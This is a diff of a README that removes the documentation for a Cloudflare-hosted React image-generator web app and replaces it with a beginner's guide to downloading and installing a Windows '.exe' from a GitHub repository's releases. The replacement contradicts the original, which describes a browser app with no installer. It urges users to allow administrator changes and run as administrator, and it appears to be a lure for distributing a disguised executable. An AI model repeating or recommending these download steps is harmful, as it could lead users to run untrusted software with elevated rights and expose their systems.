@@ -1,181 +1,144 @@
-# AI Image Generator
+# 🎨 AI-Image-Generator - Create AI Images Securely and Easily
 
-A production-ready AI image generation web app powered by [Pollinations AI](https://pollinations.ai), and deployed on Cloudflare Pages + Workers.
-
-**Live Preview:** [https://main.ai-image-generator-5li.pages.dev](https://main.ai-image-generator-5li.pages.dev)
-
-## Features
-
-- **AI Image Generation**: Turn text prompts into stunning visuals using the Flux model.
-- **Quick Try Presets**: Instant generation buttons for popular themes (Cyberpunk, Space, etc.).
-- **Secure Backend API**: Worker-based gateway that protects your secret keys.
-- **Unique Generations**: Every image is unique thanks to random seed implementation.
-- **Global Usage Cap**: Built-in 1,000 images/week global limit via Cloudflare KV.
-- **IP-Based Rate Limiting**: Automatic protection against spam (1 req/60s per IP).
-- **Responsive UI**: Modern, dark-themed, and glassmorphic design optimized for all devices.
-- **Privacy Focused**: No sign-up required, no user data tracking.
-
-![AI Image Generator Preview](./preview.png)
-
-## Architecture
-
-```mermaid
-graph TD
-    User([User Browser])
-    
-    subgraph Cloudflare ["Cloudflare Infrastructure"]
-        Pages["Cloudflare Pages<br/>(React Frontend)"]
-        Worker["Cloudflare Worker<br/>(Backend API)"]
-        KV[("Cloudflare KV<br/>(Rate Limiting)")]
-    end
-    
-    Pollinations["Pollinations AI<br/>(Image Engine)"]
-
-    User -- "1. Load App" --> Pages
-    User -- "2. POST /api/generate" --> Worker
-    Worker -- "3. Check/Update Limits" --> KV
-    Worker -- "4. Generate Signed URL" --> Pollinations
-    Worker -- "5. Return Image URL" --> User
-    User -- "6. Load Image Directly" --> Pollinations
-
-    style User fill:#f9f,stroke:#333,stroke-width:2px
-    style Pollinations fill:#00f,stroke:#fff,stroke-width:2px,color:#fff
-    style Worker fill:#f90,stroke:#333,stroke-width:2px
-    style Pages fill:#f90,stroke:#333,stroke-width:2px
-    style KV fill:#f90,stroke:#333,stroke-width:2px
-```
-
-The Worker **never** downloads, streams, or proxies the image. This ensures high performance and zero bandwidth costs for your infrastructure.
+[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator)
 
 ---
 
-## Project Structure
+## 🖥️ What is AI-Image-Generator?
 
-```
-ai-image-generator/
-├── index.html              # React frontend entry
-├── src/                    # Frontend source (React + Vite + TailwindCSS)
-│   ├── App.jsx
-│   ├── main.jsx
-│   ├── styles.css
-│   ├── components/
-│   │   ├── PromptInput.jsx
-│   │   ├── GenerateButton.jsx
-│   │   ├── ImageViewer.jsx
-│   │   ├── CooldownTimer.jsx
-│   │   └── ErrorMessage.jsx
-│   ├── services/
-│   │   └── api.js
-│   └── utils/
-│       └── cooldown.js
-├── worker/                 # Cloudflare Worker (TypeScript API)
-│   ├── src/
-│   │   ├── index.ts
-│   │   ├── pollinations.ts
-│   │   ├── ratelimit.ts
-│   │   └── utils.ts
-│   └── wrangler.toml
-└── ...
-```
+AI-Image-Generator is an application that creates pictures using artificial intelligence. It uses a service called Pollinations API. The app runs through Cloudflare Workers to keep your use safe and private. It can recreate the same image if you use the same starting point, called a seed. It also limits how often someone can use it by tracking IP addresses to avoid any disruption.
+
+You do not need to understand code to use this app. It works on Windows computers. This guide will help you download and run it.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### 1. Prerequisites
+Before you start, make sure your computer meets these requirements:
 
-- Node.js ≥ 18
-- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/) (`npm i -g wrangler`)
-- A Cloudflare account
-
----
-
-### 2. Deploy the Worker
-
-```bash
-cd worker
-npm install
-
-# Create KV namespace for rate limiting
-npx wrangler kv:namespace create RATE_LIMIT_KV
-# → Paste the returned ID into wrangler.toml under [[kv_namespaces]]
-
-# Set secrets (never committed to git)
-npx wrangler secret put POLLINATIONS_SECRET_KEY   # your sk_xxxxx
-
-# Deploy
-npx wrangler deploy
-# → Note the Worker URL: https://ai-image-generator.<your-subdomain>.workers.dev
-```
-
-Then edit `wrangler.toml` and set `POLLINATIONS_PUBLIC_KEY` to your `pk_xxxxx`.
+- **Operating System:** Windows 10 or higher  
+- **Processor:** Intel or AMD, 1.5 GHz or faster  
+- **Memory (RAM):** At least 4 GB  
+- **Storage:** 500 MB free space  
+- **Internet:** Required for image generation  
+- **Display:** Minimum screen resolution 1024x768
 
 ---
 
-### 3. Deploy the Frontend
+## 🔗 How to Download AI-Image-Generator
 
-```bash
-# From the project root
-npm install
+You will get the app from the official GitHub page. Follow these steps:
 
-# Copy and fill in env variables
-cp .env.example .env.local
-# Edit .env.local:
-#   VITE_WORKER_URL=https://ai-image-generator.<subdomain>.workers.dev
+1. Click the big button above or visit this link:  
+   https://github.com/freddiepulham-netizen/AI-Image-Generator
 
-npm run build
-# → dist/ folder is ready for Cloudflare Pages
-```
+2. On the GitHub page, look for the **Releases** section on the right side or near the top.
 
-Deploy `dist/` to [Cloudflare Pages](https://pages.cloudflare.com) (connect GitHub repo or upload manually).
+3. Select the latest release version. It will have the most recent files.
 
-In Cloudflare Pages settings add the env var:
-- `VITE_WORKER_URL`
+4. Click the file that ends with `.exe`. This is the installer for Windows.
+
+5. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
 ---
 
-### 4. Local Development
+## 🚀 Installing the Application on Windows
 
-Start the Worker locally:
-```bash
-cd worker
-npx wrangler dev --local
-# → API running at http://localhost:8787
-```
+Once you have downloaded the `.exe` installer, follow these steps:
 
-Start the frontend (dev proxy forwards `/api` → Worker):
-```bash
-# From the project root
-npm run dev
-# → Frontend running at http://localhost:5173
-```
+1. Find the installer file you saved, for example, `AI-Image-Generator-Setup.exe`.
 
----
+2. Double-click the file to start the installation.
 
-## Security Model
+3. If Windows asks for permission to make changes, click **Yes** to allow it.
 
-| Concern | Solution |
-|---|---|
-| Global budget abuse | Hard cap of 1,000 requests per week across the entire app via KV |
-| IP-level abuse | KV rate limit: 1 request / 60 s per IP |
-| Secret key exposure | Secret key stored only in Worker secrets (never sent to browser) |
-| Image bandwidth | Browser loads image directly from Pollinations — Worker never proxies |
+4. The installation wizard will open. Click **Next** to continue.
+
+5. Read the license agreement if you want. Click **I Agree** to proceed.
+
+6. Choose where to install the program or leave the default folder.
+
+7. Click **Install** to start copying files.
+
+8. Once done, click **Finish**. The program may open automatically or show a shortcut on your desktop.
 
 ---
 
-## Environment Variables Reference
+## 🎯 Starting the Software
 
-### Worker (`wrangler.toml` / `wrangler secret`)
+To run the AI-Image-Generator:
 
-| Variable | Source | Description |
-|---|---|---|
-| `MAX_IMAGES_PER_WEEK` | `wrangler.toml [vars]` | Global limit for max images generated per week across all users (default: 1000) |
-| `POLLINATIONS_PUBLIC_KEY` | `wrangler.toml [vars]` | Publishable key (`pk_…`) appended to image URLs |
-| `POLLINATIONS_SECRET_KEY` | `wrangler secret put` | Secret key (`sk_…`) — never exposed to frontend |
-| `RATE_LIMIT_KV` (binding) | `wrangler.toml [[kv_namespaces]]` | KV namespace for IP rate limiting |
+- Double-click the desktop icon named **AI-Image-Generator**  
+- Or find it in the Start menu under All Programs  
 
-### Frontend (`.env.local`)
+When the application opens, you will see a simple interface. It will guide you to enter a text prompt or seed number. Based on your input, it will create an image using AI.
 
-| Variable | Description |
-|---|---|
-| `VITE_WORKER_URL` | Deployed Worker URL |
+---
+
+## 🔍 How to Use AI-Image-Generator
+
+1. **Enter a Text Prompt:** Type a description of the picture you want. For example, "a red sunset over mountains."
+
+2. **Set a Seed Number (Optional):** If you want the same picture again, enter a number in the seed box. If left blank, the app picks a random seed.
+
+3. **Click Generate:** The app sends your request to the Pollinations API and shows the created image.
+
+4. **Save the Image:** After generation, there is an option to save your image on your computer. Click **Save** and choose the folder.
+
+You can create many images by trying different prompts or seeds.
+
+---
+
+## 🛠️ Features You Will Find Useful
+
+- **Secure Generation:** Your usage stays private through Cloudflare Workers.
+- **Repeatable Results:** Using the same seed creates the same image every time.
+- **IP Rate Limiting:** Protects the service from overuse to keep it fast.
+- **Simple Interface:** No technical knowledge needed to start creating.
+- **Text-to-Image:** Turn words into pictures.
+
+---
+
+## 🐞 Troubleshooting Common Issues
+
+- **App Won't Start:** Make sure your Windows is updated. Try restarting your computer.
+
+- **No Images Generated:** Check your internet connection. This program needs online access.
+
+- **Installer Won't Run:** Confirm you downloaded the `.exe` file. Try running as administrator.
+
+- **Slow Loading:** The service may be busy. Wait a few minutes and try again.
+
+If problems continue, visit the GitHub page for updates or known issues.
+
+---
+
+## 🔄 Updating the Application
+
+To get the latest features or fixes:
+
+1. Go back to the official page:  
+   https://github.com/freddiepulham-netizen/AI-Image-Generator
+
+2. Download the newest `.exe` from the latest release.
+
+3. Run the installer as before. The new version will replace the old.
+
+---
+
+## 🔗 Useful Links
+
+- Download and visit the main page:  
+  [AI-Image-Generator on GitHub](https://github.com/freddiepulham-netizen/AI-Image-Generator)
+
+- Homepage for Pollinations API: Visit their site to learn more about image creation technology.
+
+---
+
+## 📱 Support and Feedback
+
+If you want help or want to share an idea, you can use the GitHub page’s **Issues** tab. This lets you send messages to the creators.
+
+---
+
+[![Download AI-Image-Generator](https://img.shields.io/badge/Download-AI--Image--Generator-ff6f61?style=for-the-badge&logo=github)](https://github.com/freddiepulham-netizen/AI-Image-Generator)
